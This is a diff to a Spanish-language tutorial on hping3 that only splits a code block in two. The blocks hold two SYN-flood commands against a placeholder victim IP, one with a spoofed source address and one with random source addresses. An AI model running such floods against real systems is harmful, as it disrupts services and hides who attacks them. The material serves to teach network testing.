@@ -82,5 +82,7 @@ Se puede comprobar que <b>-p</b> es utilizado para determinar el puerto, que <b>
 
 ```
 hping3 -a [ip_atacante_falsa] -p 80  -S --flood [ip_victima] # IP de origen encubierta
+```
+```
 hping3 --rand-source -p 80  -S --flood [ip_victima] # IP de origen generada aleatoriamente
 ```
